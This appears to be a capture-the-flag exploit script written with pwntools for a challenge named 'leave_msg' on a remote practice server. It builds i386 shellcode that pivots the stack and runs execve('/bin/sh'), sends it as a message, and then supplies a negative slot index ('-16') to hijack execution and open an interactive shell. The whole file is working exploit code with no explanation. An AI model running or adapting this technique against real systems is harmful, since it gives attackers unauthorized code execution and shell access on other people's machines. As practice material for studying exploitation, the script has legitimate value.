from pwn import *
context(log_level = "debug", arch = 'i386', os = 'linux',)


#target = process('./leave_msg')
target = remote('hackme.inndy.tw',7715)
payload = asm('add esp,0x36;jmp esp') + '\x00' + asm(shellcraft.execve('/bin/sh'))
#gdb.attach(target,'b *0x0804861D')
target.sendlineafter('message:', payload)

payload =  '-16'
target.sendlineafter('Which message slot?',payload)
target.interactive()